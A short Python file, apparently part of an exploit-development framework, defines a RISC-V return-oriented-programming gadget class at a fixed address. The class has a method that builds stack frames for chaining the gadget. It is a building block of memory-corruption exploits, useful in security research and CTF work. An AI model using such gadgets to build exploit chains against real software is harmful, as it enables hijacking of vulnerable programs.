from bf_parser.rop_gadgets_base_class import ROP_Gadget

class RestoreA3(ROP_Gadget):
    '''
    lw a3, 0x40(s0)
    ld ra, 0x18(sp)
    ld s0, 0x10(sp)
    ld s1, 0x8(sp)
    ld s2, 0(sp)
    addi sp, sp, 0x20
    jr ra
    '''
    def __init__(self):
        super().__init__(0x4875a, 0x20)

    def construct_frame(self, ra=0, s0=0, s1=0, s2=0):
        data = [s2, s1, s0, ra]
        self.set_stack_frame(data)
        return self.print_gadget()